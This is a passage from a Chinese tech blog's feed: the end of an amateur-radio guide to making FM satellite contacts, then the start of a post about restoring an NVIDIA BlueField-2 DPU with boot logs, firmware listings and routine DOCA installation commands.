ggVkCBaQsb8i+cLFwUcGFIfcNvz51Zv+pq2H/6Yh2K+csIAMwQIyBAvIECwgQ7CADMECMgQLyBAsIEOwgIz9FclPZmS31+k+MbSXecjcdPhtb3vEhfeyfUlHfkhwarzeCQvIECwgQ7CADMECMgQLyBAsIEOwgAzBAjIEC8jYn3R/4sjQ+W3rq4/c6YUP8ML/HOBNq+LXLvyNx5oTFpAhWECGYAEZggVkCBaQIVhAhmABGYIFZAgWkHFm0n17FHtoffWRqejcnQ7JjZW3Hu+F0+pPOGEBGYIFZAgWkCFYQIZgARmCBWQIFpAhWEDGZ2jucciFQ4ZHZgW3h06H9hGvXbgM+sklXbgq+s9/6JGr/XHCAkIEC8gQLCBDsIAMwQIyBAvIECwgQ7CADMECMvZXJF844b3tydzz3zPxf+Ey6JYnX5Whnxm0vkg/TlhAiGABGYIFZAgWkCFYQIZgARmCBWQIFpAhWEDG/qR7bjv40FDvkTtde9Pj3TZ3PYvn8GSs/MhXZe3IrzjWnLCADMECMgQLyBAsIEOwgAzBAjIEC8gQLCBDsICMMzvdF699skB9e5J4bkB5+07fZG6AfvtvujY0kn7kxyEv+5o5YQEZggVkCBaQIVhAhmABGYIFZAgWkCFYQMb+4OjakS292++c2608dEkvGzIcsv3wj2yRPvI1m/siOWEBGYIFZAgWkCFYQIZgARmCBWQIFpAhWECGYAEZnyPDrLcNaj+5niMj6duO/NWOrAbOOfIcjvxNn3DCAjIEC8gQLCBDsIAMwQIyBAvIECwgQ7CADMECMvYn3b+8b2qn+xNGsf+xeA5za8WPzH8bOv/6oWtPLskJC8gQLCBDsIAMwQIyBAvIECwgQ7CADMECMgQLyJja6T40K5zb/7244LkHeNue/iN3OjeKvT3T/4SZ/n84YQEZggVkCBaQIVhAhmABGYIFZAgWkCFYQMav7VcemWxcay2ZfcKdPnzh+jlcOIG8MHenRyaQ15ywgAzBAjIEC8gQLCBDsIAMwQIyBAvIECwgQ7CAjP1J96G9t0+GrYfma9+0nXbtyNrrIS/bQP3n3/ZOTlhAhmABGYIFZAgWkCFYQIZgARmCBWQIFpAhWEDG58I13rc5Mum+dmQU+8jbbj/8uS/2hd+HhQun9p/cqRMWkCFYQIZgARmCBWQIFpAhWECGYAEZggVkCBaQMbXTvWU9envkxwBDA8pztr8PF97p9iXN/aMY+m8Qtj/0FCcsIEOwgAzBAjIEC8gQLCBDsIAMwQIyBAvI2B8cXft7JhvXbpt7fDIie+G24oUjQ49DD/DrOw/ZHpGdu1onLCBDsIAMwQIyBAvIECwgQ7CADMECMgQLyBAsIGNq0n1taAr5tmngn/umw58MKF94SRfu8N125F6GBtbn5uCdsIAMwQIyBAvIECwgQ7CADMECMgQLyBAsIEOwgIwzk+4tF64kPzKSfsSRH0Vc+KHb69XnLukIJywgQ7CADMECMgQLyBAsIEOwgAzBAjIEC8gQLCDDpPt3bxo6v3B2+chS/CO7zHMufA5OWECGYAEZggVkCBaQIVhAhmABGYIFZAgWkHFmcPS2ccq13IrkxWvn7mV7VnDoTp/MLg6Nla4N/U2HZjiPPKIfJywgRLCADMECMgQLyBAsIEOwgAzBAjIEC8gQLCBjatL9ZbtiF46M/B7Z8Lv9tk9GsbcvKfcNHLrTC1dFP/lH4YQFZAgWkCFYQIZgARmCBWQIFpAhWECGYAEZggVkfFrr1YG/mRMWkCFYQIZgARmCBWQIFpAhWECGYAEZggVkCBaQIVhAhmABGYIFZAgWkCFYQIZgARmCBWQIFpAhWECGYAEZ/we0wLFX+jpXmwAAAABJRU5ErkJggg==" alt="img" data-caption="img" loading="lazy"></td></tr></tbody></table><h2 id="软件部分"><a href="#软件部分" class="headerlink" title="软件部分"></a>软件部分</h2><p>对于 FM 卫星通联，会受到一个叫多普勒效应的影响，这使得接受和发射的频率并不是固定的，所以我们一般会设置 5 个频率，并存储到信道中。这是在 <a href="https://forum.hamcq.cn/d/351/2">HamCQ 论坛中分享的频率表</a>，找到想要上的卫星然后写入到电台中的信道中，并做好区域划分，在此不做过多叙述。</p><p>对于卫星通联，还有一个问题是：如何知道卫星什么时候过境，什么时候出境？卫星什么时候开机？</p><h3 id="卫星出入境"><a href="#卫星出入境" class="headerlink" title="卫星出入境"></a>卫星出入境</h3><p><a href="https://github.com/rt-bishop/Look4Sat">Look4Sat</a> 可以帮你解决这个问题，他是一款开源免费的 Android 端追星软件，界面非常简洁直观。</p><p>初次使用只需要去设置里面更新 GPS 和 转发器数据，再添加想要的卫星，就能到主界面看到了。在打卫星的时候软件的具体操作后续有演示。</p><h3 id="卫星状况"><a href="#卫星状况" class="headerlink" title="卫星状况"></a>卫星状况</h3><p>卫星的状态可以在这个网站上查看到：<a href="https://www.amsat.org/status/">https://www.amsat.org/status/</a> 这是爱好者自行反馈的状态。</p><p>PO-101 和 UVSQ 卫星的 FM 转发器的开机时刻是在 X 上有发推文，ISS 的维护时刻表在 AMSAT 网站上有。</p><p>前期准备部分就结束了，接下来就是最重要的部分，也是我最想告诉大家的。</p><h1 id="如何提高-QSO-效率"><a href="#如何提高-QSO-效率" class="headerlink" title="如何提高 QSO 效率"></a>如何提高 QSO 效率</h1><h2 id="卫星的选择"><a href="#卫星的选择" class="headerlink" title="卫星的选择"></a>卫星的选择</h2><p>卫星的选择是非常重要的，我们目前常用的 FM 卫星有 ISS, SO-50, AO-91 和 PO-101。</p><p>ISS 最近挤成菜市场了，还被各种高功率压制，很难完成 QSO。但是你可以在晚上3点到早上9点的时候去上，因为没人，就算你用原装天线也能上的去。</p><p>SO-50 因为转发器体质不佳，转发质量越来越差，而且有频偏。不过最近又好起来了，他只有0.25W的功率，但声音质量也很棒。</p><p>AO-91 好像是电池坏了，只在白天能用，并且转发器也有问题，断续很严重。</p><p>相比之下 PO-101 则很棒了，唯一的缺点是需要等开机时间，并且上去的难度也挺高的，对天线和环境有一定的要求，PO-101 是我挺喜欢上的一颗卫星，QSO 效率很高，而且也不挤。</p><p>还有一颗 SO-121，开机随缘，声音说实话还可以，很有意思，可以约别人一起去玩。</p><p><strong>其实只要选对卫星，你通联的效率就会成倍的提升，并且可以直接避免被人压制导致空军，然后一肚子气<del>提控回家</del>。</strong></p><p>所以总的来说，我的建议就是挑阴间时间上 ISS 和 SO-50，PO-101 看开机时间去上。 </p><h2 id="如何正确完成卫星通联"><a href="#如何正确完成卫星通联" class="headerlink" title="如何正确完成卫星通联"></a>如何正确完成卫星通联</h2><h3 id="秩序"><a href="#秩序" class="headerlink" title="秩序"></a>秩序</h3><p>对于这个，我唯一强调的是通联的<strong>秩序</strong>，相信你肯定不想在和别人 QSO 的过程中被人一句 <code>CQ Satellite</code> 打断吧。</p><p>对于正在通联的双方来说，可能某一方回复另一方的时候被压制了，导致 QSO 终端。然后另一方又开始回复对方，可能这个时候有其他友台回复你了，然后你压的那方又继续在和那一方在通联，把你也<strong>压了</strong>。这就是一个死循环了，最后谁也没完成 QSO。</p><blockquote><p>你们别吵啦，一个一个来</p></blockquote><h3 id="正确方法"><a href="#正确方法" class="headerlink" title="正确方法"></a>正确方法</h3><p>最重要的是先守听，等待听到有下行信号（载波&#x2F;话音）时，在别人 QSO 结束的结尾，找到间隙主动呼叫对方。</p><p><strong>以下是示例</strong>：</p><blockquote><p><em>BG7QIW: Bravo Hotel Seven Foxtrot Bravo Papa, Bravo Golf Seven Quebec India Whiskey five nine</em></p><p><em>BH7FBP: Bravo Golf Seven Quebec India Whiskey, Bravo Hotel Seven Foxtrot Bravo Papa U ALSO five nine seventeen three~</em></p><p><em>BG7QIW: seventeen three!</em></p></blockquote><p>这时你可以插入，主动呼叫 BG7QIW 或者 BH7FBP，因为他俩上下行都很不错，呼叫他俩 QSO 的成功率对于你自己来说会很高。如果你主动 CQ 的话，这样就耽搁了一个时隙，别人需要呼叫你，你再回复。这样相较于主动呼叫别人时间耗费更多，降低了效率。</p><p><strong>例如：</strong></p><blockquote><p><em>BH7FBP: Bravo Golf Seven <strong>Quebec India Whiskey</strong>, Bravo Hotel Seven <strong>Foxtrot Bravo Papa</strong>, U ALSO five nine seventeen three~</em></p><p><em>BG7QIW: seventeen three!</em></p><p><em>BI7BMB: Bravo Golf Seven <strong>Quebec India Whiskey</strong>, Bravo India Seven <strong>Bravo Mike Bravo</strong> five by nine</em></p><p><em>BG7QIW: Bravo %$#Buzzzzz%$# Bravo %$#Buzzzzz%$# Seven Quebec %$#Buzzzzz%$#</em></p></blockquote><p>欸，怎么没抄完整，我应不应该回复他。没问题！大胆回复他，就算没抄完整，只要你有90%的把握他在呼叫你，直接回复。这时应该回复什么呢。</p><blockquote><p><em>BI7BMB: QSL Seventeen Three! &#x2F; 抄收了 73 再见</em></p></blockquote><h4 id="关于呼叫"><a href="#关于呼叫" class="headerlink" title="关于呼叫"></a>关于呼叫</h4><p>大家在卫星上呼叫的用语有挺多种的，我目前用的是呼号 + 网格。这是在 <a href="https://www.amsat.org/station-and-operating-hints/">AMSAT 网站</a> 上关于 FM 卫星通联推荐的做法。关于这个也挺有争议的，我的意见是：不论你说什么，能简短迅速的让别人知道的呼号，就够了。</p><p>什么时候可以主动呼叫呢，只有当你有十足的把握卫星当前是空闲没人在通联的状态，并且你的上行能上去，或你有全双工的设备，实时能返听到你的话音的情况下，那可以随意呼叫。</p><p><del>我一般是某趟卫星在<strong>阴间时间</strong>，并且在仰角（5°-10°）发现没有下行，然后掐 PTT 发现有<strong>回波</strong>的时候，我会这样做。</del></p><p><strong>但是热门时段就千万别这样做了，可能你没有下行信号的时候，你上行信号上去了把别人压制了，然后就是之前我说的惨状，这现象在 SO-50 上非常常见，聋子很多。</strong></p><blockquote><p><em>回波：指掐 PTT 之后能听到有空音频的载波信号下来，同时场强表有明显的上升，随后变成沙沙声，那段空音频就是回波。在卫星通联中只有 ISS 比较明显。受限于电台型号的不同，某些电台型号效果不明显，或者开了尾音消除。建议新手不要这样做，耐心等待有下行即可。</em></p></blockquote><h2 id="通联示范"><a href="#通联示范" class="headerlink" title="通联示范"></a>通联示范</h2><p>接下来就是我通联的示范了，我用的是 8600 + U7V4。</p><p>视频演示</p><h1 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h1><h2 id="通联的时候抄不清对方呼号怎么办？"><a href="#通联的时候抄不清对方呼号怎么办？" class="headerlink" title="通联的时候抄不清对方呼号怎么办？"></a>通联的时候抄不清对方呼号怎么办？</h2><p>多听，多练，这是一个熟能生巧的过程，不可能一天之内变得很熟练。</p><p>我的技巧是每次打卫星都把手机的录音打开，当别人在呼叫你，而你吵不清别人呼号的时候或脑子反应不过来（我也是这样），直接鹦鹉学舌，他怎么样说过来的，你把他说的那段话带着你的呼号回给他，当这趟卫星打完了之后，再慢慢听录音，只要确保对方把你的呼号抄正确了就行。</p><p>还有一个技巧就是挑没人的时候去上卫星，就算抄不清，你可以要求别人重复过来一遍，一般大家都会耐心的等你俩通联完再来通联。</p><blockquote><p><em>BI7BMB: Bravo Golf Question? &#x2F; Please Again &#x2F; 再来一下好吗</em></p><p><em>BG7QIW: Bravo Golf Seven <strong>Quebec India Whiskey</strong> Queen Italian Whisky BG7QIW</em></p><p><em>BI7BMB: BG7QIW BI7BMB 59 73</em></p><p><em>BG7QIW: 73</em></p></blockquote><p>就像这样，这个时间段不会有人来压制 &#x2F; 插入你们俩之间。而是慢慢的等你们通联完，再来呼叫。然后你可能会被<del>轰炸</del>，叫你让你回到嘴巴冒烟，因为你是新台，23333。</p><h2 id="别人反馈我的话音质量很差-我收到的下行很差"><a href="#别人反馈我的话音质量很差-我收到的下行很差" class="headerlink" title="别人反馈我的话音质量很差 &#x2F; 我收到的下行很差"></a>别人反馈我的话音质量很差 &#x2F; 我收到的下行很差</h2><p>首先检查的应该是天线情况，有可能你的八木的引向器装反了，或者是装错位置了，有条件的直接上驻波表测试。还有一个原因是你的手机指南针不准，对歪了。这个时候你可以靠感觉来调整，找到一个下行比较好的位置，同时观察手机屏幕角度的变化随之调整你手举着的天线的方位角和仰角。</p><p>手机指南针失灵是很正常的，我打卫星几乎有一半的概率指南针会飘。不过自己玩得多了，靠感觉盲指也没问题，这也是一个熟练度的问题。</p><p>2024.09.09</p><p>BH7FBP</p><p>审稿：BG7QIW</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;近期在打 ISS 的时候发现挺多的友台入坑了，晚间的 ISS 非常热闹。作为一个入坑 FM 卫星通联 6 个月的无线电爱好者，掌握了一定的通联技巧，所以在此分享一下我的经验。&lt;/p&gt;
&lt;h1 id=&quot;前期准备&quot;&gt;&lt;a href=&quot;#前期准备&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="无线电" scheme="https://blog.irec.moe/categories/%E6%97%A0%E7%BA%BF%E7%94%B5/"/>
    
    
    <category term="卫星" scheme="https://blog.irec.moe/tags/%E5%8D%AB%E6%98%9F/"/>
    
  </entry>
  
  <entry>
    <title>NVIDIA BlueField-2 DPU 配置为 NIC 网卡的折腾过程</title>
    <link href="https://blog.irec.moe/nvidia_boyfriend.html"/>
    <id>https://blog.irec.moe/nvidia_boyfriend.html</id>
    <published>2024-07-16T04:00:00.000Z</published>
    <updated>2024-08-15T06:20:07.360Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h1><p>朋友搞来一块 NVIDIA BlueField-2 给我来玩玩，据说是他进 DPU 里面的 ARM 系统里面执行了一下更新命令，然后电脑设备管理器就感叹号了，里面的 ARM 跑着的系统也挂了。具体的情况他也不清楚，反正就到我手上了。</p><p>让他发了一块好的和一块坏的，两张都收到了，还带了一个 VMWare的 Edge 310 给我来研究。</p><img src="/nvidia_boyfriend/DSC1087.jpg" class="" title="DSC1087"><h1 id="实物情况"><a href="#实物情况" class="headerlink" title="实物情况"></a>实物情况</h1><h2 id="第一块"><a href="#第一块" class="headerlink" title="第一块"></a>第一块</h2><p>图片是后补的，不要介意。</p><img src="/nvidia_boyfriend/DSC1091.jpg" class="" title="DSC1091"><img src="/nvidia_boyfriend/DSC1094.jpg" class="" title="DSC1094"><h3 id="背面标签"><a href="#背面标签" class="headerlink" title="背面标签"></a>背面标签</h3><p>Model No：BF2M345A</p><p>P&#x2F;N: MBF2M345A-VENOT_ES</p><p>S&#x2F;N: MT219X37294</p><p>开机非常慢，设备管理器有一个模块报错误10</p><img src="/nvidia_boyfriend/image-20240715233118990.png" class="" title="image-20240715233118990"><p>使用和主机通讯的串口，不知道账户和密码，只能重置了。</p><h3 id="启动信息"><a href="#启动信息" class="headerlink" title="启动信息"></a>启动信息</h3><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">Mellanox BlueField-2 A1 BL1 V1.1</span></span><span class="line"><span style="color: #abb2bf">NOTICE:  BL2R: v2.2(release):3.7.1-1-g7a249ba</span></span><span class="line"><span style="color: #abb2bf">NOTICE:  BL2R: Built : 18:59:31, Jul 22 2021</span></span><span class="line"><span style="color: #abb2bf">NOTICE:  BL2R built for hw (ver 1)</span></span><span class="line"><span style="color: #abb2bf">NOTICE:  No CDI given, can&#39;t complete Riot operation</span></span><span class="line"><span style="color: #abb2bf">NOTICE:  BL2R: Booting BL2</span></span><span class="line"><span style="color: #abb2bf">NOTICE:  BL2: v2.2(release):3.7.1-1-g7a249ba</span></span><span class="line"><span style="color: #abb2bf">NOTICE:  BL2: Built : 18:59:30, Jul 22 2021</span></span><span class="line"><span style="color: #abb2bf">NOTICE:  BL2 built for hw (ver 1)</span></span><span class="line"><span style="color: #abb2bf">NOTICE:  Running as MBF2M345A-VENOT_ system</span></span><span class="line"><span style="color: #abb2bf">NOTICE:  No SPD detected on MSS0 DIMM0</span></span><span class="line"><span style="color: #abb2bf">NOTICE:  No SPD detected on MSS0 DIMM1</span></span><span class="line"><span style="color: #abb2bf">NOTICE:  Finished initializing DDR</span></span><span class="line"><span style="color: #abb2bf">NOTICE:  DDR POST passed.</span></span><span class="line"><span style="color: #abb2bf">NOTICE:  BL31: v2.2(release):3.7.1-1-g7a249ba</span></span><span class="line"><span style="color: #abb2bf">NOTICE:  BL31: Built : 18:59:31, Jul 22 2021</span></span><span class="line"><span style="color: #abb2bf">NOTICE:  BL31 built for hw (ver 1)</span></span></code></pre></div></div></figure><h3 id="固件版本"><a href="#固件版本" class="headerlink" title="固件版本"></a>固件版本</h3><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">C:\Program Files\Mellanox\WinMFT&gt;mlxfwmanager.exe</span></span><span class="line"><span style="color: #abb2bf">Querying Mellanox devices firmware ...</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">Device #1:</span></span><span class="line"><span style="color: #abb2bf">----------</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">  Device Type:      BlueField2</span></span><span class="line"><span style="color: #abb2bf">  Part Number:      MBF2M345A-VENOT_ES_Ax</span></span><span class="line"><span style="color: #abb2bf">  Description:      NVIDIA BlueField-2 E-Series Eng. sample DPU; 200GbE single-port QSFP56; PCIe Gen4 x16; Secure Boot Disabled; Crypto Enabled; 16GB on-board DDR; 1GbE OOB management</span></span><span class="line"><span style="color: #abb2bf">  PSID:             MT_0000000809</span></span><span class="line"><span style="color: #abb2bf">  PCI Device Name:  mt41686_pciconf0</span></span><span class="line"><span style="color: #abb2bf">  Base GUID:        b8cef60300f8d88a</span></span><span class="line"><span style="color: #abb2bf">  Base MAC:         b8cef6f8d88a</span></span><span class="line"><span style="color: #abb2bf">  Versions:         Current        Available</span></span><span class="line"><span style="color: #abb2bf">     FW             24.31.0356     N/A</span></span><span class="line"><span style="color: #abb2bf">     PXE            3.6.0401       N/A</span></span><span class="line"><span style="color: #abb2bf">     UEFI           14.24.0013     N/A</span></span><span class="line"><span style="color: #abb2bf">     UEFI Virtio blk   22.1.0011      N/A</span></span><span class="line"><span style="color: #abb2bf">     UEFI Virtio net   21.1.0011      N/A</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">  Status:           No matching image found</span></span></code></pre></div></div></figure><h2 id="第二块"><a href="#第二块" class="headerlink" title="第二块"></a>第二块</h2><h3 id="启动信息-1"><a href="#启动信息-1" class="headerlink" title="启动信息"></a>启动信息</h3><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">Mellanox BlueField-2 A1 BL1 V1.1</span></span><span class="line"><span style="color: #abb2bf">NOTICE:  BL2R: v2.2(release):3.7.1-1-g7a249ba</span></span><span class="line"><span style="color: #abb2bf">NOTICE:  BL2R: Built : 18:59:31, Jul 22 2021</span></span><span class="line"><span style="color: #abb2bf">NOTICE:  BL2R built for hw (ver 1)</span></span><span class="line"><span style="color: #abb2bf">NOTICE:  No CDI given, can&#39;t complete Riot operation</span></span><span class="line"><span style="color: #abb2bf">NOTICE:  BL2R: Booting BL2</span></span><span class="line"><span style="color: #abb2bf">NOTICE:  BL2: v2.2(release):3.7.1-1-g7a249ba</span></span><span class="line"><span style="color: #abb2bf">NOTICE:  BL2: Built : 18:59:30, Jul 22 2021</span></span><span class="line"><span style="color: #abb2bf">NOTICE:  BL2 built for hw (ver 1)</span></span><span class="line"><span style="color: #abb2bf">NOTICE:  Running as MBF2M345A-VENOT_ system</span></span><span class="line"><span style="color: #abb2bf">NOTICE:  No SPD detected on MSS0 DIMM0</span></span><span class="line"><span style="color: #abb2bf">NOTICE:  No SPD detected on MSS0 DIMM1</span></span><span class="line"><span style="color: #abb2bf">NOTICE:  Finished initializing DDR</span></span><span class="line"><span style="color: #abb2bf">NOTICE:  DDR POST passed.</span></span><span class="line"><span style="color: #abb2bf">NOTICE:  BL31: v2.2(release):3.7.1-1-g7a249ba</span></span><span class="line"><span style="color: #abb2bf">NOTICE:  BL31: Built : 18:59:31, Jul 22 2021</span></span><span class="line"><span style="color: #abb2bf">NOTICE:  BL31 built for hw (ver 1)</span></span></code></pre></div></div></figure><h3 id="固件版本-1"><a href="#固件版本-1" class="headerlink" title="固件版本"></a>固件版本</h3><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">Device #1:</span></span><span class="line"><span style="color: #abb2bf">----------</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">  Device Type:      BlueField2</span></span><span class="line"><span style="color: #abb2bf">  Part Number:      MBF2M345A-VENOT_ES_Ax</span></span><span class="line"><span style="color: #abb2bf">  Description:      NVIDIA BlueField-2 E-Series Eng. sample DPU; 200GbE single-port QSFP56; PCIe Gen4 x16; Secure Boot Disabled; Crypto Enabled; 16GB on-board DDR; 1GbE OOB management</span></span><span class="line"><span style="color: #abb2bf">  PSID:             MT_0000000809</span></span><span class="line"><span style="color: #abb2bf">  PCI Device Name:  mt41686_pciconf0</span></span><span class="line"><span style="color: #abb2bf">  Base GUID:        b8cef60300fc5446</span></span><span class="line"><span style="color: #abb2bf">  Base MAC:         b8cef6fc5446</span></span><span class="line"><span style="color: #abb2bf">  Versions:         Current        Available</span></span><span class="line"><span style="color: #abb2bf">     FW             24.31.0356     N/A</span></span><span class="line"><span style="color: #abb2bf">     PXE            3.6.0401       N/A</span></span><span class="line"><span style="color: #abb2bf">     UEFI           14.24.0013     N/A</span></span><span class="line"><span style="color: #abb2bf">     UEFI Virtio blk   22.1.0011      N/A</span></span><span class="line"><span style="color: #abb2bf">     UEFI Virtio net   21.1.0011      N/A</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">  Status:           No matching image found</span></span></code></pre></div></div></figure><h1 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h1><p>所有的资源都是来自 NVIDIA 官网</p><h2 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h2><h3 id="DOCA-文档"><a href="#DOCA-文档" class="headerlink" title="DOCA 文档"></a>DOCA 文档</h3><p><a href="https://docs.nvidia.com/networking/dpu-doca/index.html#doca">https://docs.nvidia.com/networking/dpu-doca/index.html#doca</a></p><h3 id="1-5-1-LTS-文档"><a href="#1-5-1-LTS-文档" class="headerlink" title="1.5.1 LTS 文档"></a>1.5.1 LTS 文档</h3><p><a href="https://docs.nvidia.com/doca/archive/doca-v1.5.1/index.html">https://docs.nvidia.com/doca/archive/doca-v1.5.1/index.html</a></p><p><a href="https://docs.nvidia.com/doca/archive/doca-v1.5.1/installation-guide-for-linux/index.html#abstract">NVIDIA DOCA Installation Guide for Linux</a></p><h2 id="DOCA"><a href="#DOCA" class="headerlink" title="DOCA"></a>DOCA</h2><p><a href="https://developer.nvidia.com/doca-downloads">https://developer.nvidia.com/doca-downloads</a></p><p><a href="https://developer.nvidia.com/doca-archive">这里</a> 下载 DOCA 历史版本</p><h2 id="网卡固件"><a href="#网卡固件" class="headerlink" title="网卡固件"></a>网卡固件</h2><p><a href="https://linux.mellanox.com/public/repo/">https://linux.mellanox.com/public/repo/</a></p><h1 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h1><p>物主要求把卡弄好，当成正常的 CX6 网卡使用，参考了下面两个教程和官网的文档。</p><p><a href="https://www.bilibili.com/video/BV1Cm421s7sq">https://www.bilibili.com/video/BV1Cm421s7sq</a></p><p><a href="https://www.bilibili.com/read/cv32771337">https://www.bilibili.com/read/cv32771337</a></p><h2 id="1、安装-Ubuntu"><a href="#1、安装-Ubuntu" class="headerlink" title="1、安装 Ubuntu"></a>1、安装 Ubuntu</h2><p>这个就不用说了吧。</p><h2 id="2、安装-DOCA-环境"><a href="#2、安装-DOCA-环境" class="headerlink" title="2、安装 DOCA 环境"></a>2、安装 DOCA 环境</h2><p>直接装最新版的就行，不需要特意装1.5.1版本的。</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">wget</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">https://www.mellanox.com/downloads/DOCA/DOCA_v2.7.0/host/doca-host_2.7.0-209000-24.04-ubuntu2204_amd64.deb</span></span><span class="line"><span style="color: #61AFEF">sudo</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">dpkg</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-i</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">doca-host_2.7.0-209000-24.04-ubuntu2204_amd64.deb</span></span><span class="line"><span style="color: #61AFEF">sudo</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">apt-get</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">update</span></span><span class="line"><span style="color: #61AFEF">sudo</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">apt-get</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-y</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">install</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">doca-all</span></span></code></pre></div></div></figure><p>如果碰到卡在 building initial module ，请关闭主板的 Secure Boot 功能。</p><h2 id="3、启动-rshim"><a href="#3、启动-rshim" class="headerlink" title="3、启动 rshim"></a>3、启动 rshim</h2><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">sudo</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">systemctl</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">start</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">rshim</span></span></code></pre></div></div></figure><h2 id="4、使用-minicom-连接-DPU"><a href="#4、使用-minicom-连接-DPU" class="headerlink" title="4、使用 minicom 连接 DPU"></a>4、使用 minicom 连接 DPU</h2><p>如果没装过的话记得 sudo apt get install minicom 一下。</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">sudo</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">minicom</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-D</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/dev/rshim0/console</span></span></code></pre></div></div></figure><h2 id="5、重置-DPU-的-ARM-核"><a href="#5、重置-DPU-的-ARM-核" class="headerlink" title="5、重置 DPU 的 ARM 核"></a>5、重置 DPU 的 ARM 核</h2><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">sudo</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">echo</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;SW_RESET 1&quot;</span><span style="color: #ABB2BF"> &gt; </span><span style="color: #98C379">/dev/rshim0/misc</span></span></code></pre></div></div></figure><h2 id="6、向-DPU-更新-DOCA-1-5-1-LTS-版本"><a href="#6、向-DPU-更新-DOCA-1-5-1-LTS-版本" class="headerlink" title="6、向 DPU 更新 DOCA 1.5.1-LTS 版本"></a>6、向 DPU 更新 DOCA 1.5.1-LTS 版本</h2><p>首先必须得更新到这个版本，再更新网卡驱动，直接更新最新的 DOCA 版本的话系统会起不来，如图所示。</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">bfb-install</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">--rshim</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">rshim0</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">--bfb</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">DOCA_1.5.1_BSP_3.9.3_Ubuntu_20.04-4.2211-LTS.signed.bfb</span></span></code></pre></div></div></figure><h2 id="7、启动成功，修改默认账户和密码"><a 